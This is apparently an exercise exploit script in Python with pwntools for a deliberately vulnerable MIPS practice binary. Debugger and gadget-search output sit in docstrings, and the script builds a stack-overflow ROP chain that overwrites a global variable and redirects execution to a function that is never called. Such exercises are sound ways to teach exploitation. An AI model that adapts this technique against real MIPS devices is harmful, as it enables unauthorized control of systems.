#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x00400780 <+0>:	addiu	sp,sp,-160
...
   0x00400804 <+132>:	lw	ra,156(sp)
   0x00400808 <+136>:	lw	s8,152(sp)
   0x0040080c <+140>:	addiu	sp,sp,160
   0x00400810 <+144>:	jr	ra
   0x00400814 <+148>:	nop
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x40079c: file src/07-execve-rop.c, line 6.
(gdb) b *0x00400804
Breakpoint 2 at 0x400804: file src/07-execve-rop.c, line 11.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/07-execve-rop.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x7fffef28 "\177~\272X\177~\243\f\177|\210D"
(gdb) c
Continuing.

Breakpoint 2, 0x00400804 in vulnerable () at src/07-execve-rop.c:11
11	}
(gdb) p/x $sp+156
$2 = 0x7fffefac
"""

"""
$ qemu-mips -L /usr/mips-linux-gnu/ -strace ./bin/mips/08-overwrite-global
...
10601 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
10601 mmap2(NULL,1638448,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x7f615000
...
"""

"""
$ ropper --nocolor --file /usr/mips-linux-gnu/lib/libc-2.27.so
0x000667cc: lw $ra, 0x3c($sp); lw $s1, 0x38($sp); lw $s0, 0x34($sp); jr $ra; addiu $sp, $sp, 0x40;
0x000f2a10: sw $s0, ($s1); lw $ra, 0x3c($sp); lw $s1, 0x38($sp); lw $s0, 0x34($sp); jr $ra; addiu $sp, $sp, 0x40;
"""

import struct
import sys

from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)

binary_path = './bin/mips/08-overwrite-global'

ra_saved_addr = 0x7fffefac
buffer_addr = 0x7fffef28
libc_addr = 0x7f615000

lw_s1_s0_addr = libc_addr + 0x000667cc
sw_s0_s1_addr = libc_addr + 0x000f2a10

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']
x_addr = binary.symbols['x']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p32(lw_s1_s0_addr)

payload += 'b' * 0x34
payload += p32(0xbeefc0de) # s0
payload += p32(x_addr) # s1
payload += p32(sw_s0_s1_addr) # ra

payload += 'c' * 0x3c
payload += p32(not_called_addr) # ra

p.readuntil('> ')
p.write(payload)
p.interactive()
